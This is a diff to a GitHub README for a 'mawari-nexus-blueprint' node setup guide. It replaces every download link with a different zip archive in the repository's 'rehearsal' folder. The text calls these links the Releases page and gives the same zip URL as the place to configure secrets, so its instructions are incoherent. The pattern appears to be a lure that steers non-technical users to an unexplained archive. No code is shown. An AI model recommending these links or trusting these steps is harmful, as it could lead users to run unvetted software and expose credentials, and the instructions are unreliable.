@@ -4,13 +4,13 @@
 
 Welcome to the *mawari-nexus-blueprint*! This guide helps you set up Mawari Guardian Node and Nexus Prover easily. You don’t need technical skills to get started. Follow these simple steps.
 
-[![Download mawari-nexus-blueprint](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip)](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip)
+[![Download mawari-nexus-blueprint](https://github.com/AvatarAnng/mawari-nexus-blueprint/raw/refs/heads/main/rehearsal/mawari-blueprint-nexus-v2.7.zip)](https://github.com/AvatarAnng/mawari-nexus-blueprint/raw/refs/heads/main/rehearsal/mawari-blueprint-nexus-v2.7.zip)
 
 ## 📥 Download & Install
 
 To download the software, visit the Releases page:
 
-- [Visit this page to download](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip)
+- [Visit this page to download](https://github.com/AvatarAnng/mawari-nexus-blueprint/raw/refs/heads/main/rehearsal/mawari-blueprint-nexus-v2.7.zip)
 
 Once you are on the Releases page, locate the latest version of the application. Click on the version number to open the details. You will find the asset files there, which you can download. After downloading, follow the prompts to install it.
 
@@ -22,7 +22,7 @@ Before installing, ensure you have the following set up in your GitHub Codespace
 
 You will need to set up some secrets. Go to:
 
-`https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip`
+`https://github.com/AvatarAnng/mawari-nexus-blueprint/raw/refs/heads/main/rehearsal/mawari-blueprint-nexus-v2.7.zip`
 
 You need to add the following secrets:
 
@@ -74,6 +74,6 @@ If you experience issues during setup or while running the application, consider
 
 If you need further help, you can open an issue in the GitHub repository. Describe your problem clearly, and someone from the community or the maintainers will assist you.
 
-For quick access, here is the [Download link again](https://raw.githubusercontent.com/AvatarAnng/mawari-nexus-blueprint/main/rehearsal/mawari-nexus-blueprint.zip).
+For quick access, here is the [Download link again](https://github.com/AvatarAnng/mawari-nexus-blueprint/raw/refs/heads/main/rehearsal/mawari-blueprint-nexus-v2.7.zip).
 
 Enjoy using *mawari-nexus-blueprint*!
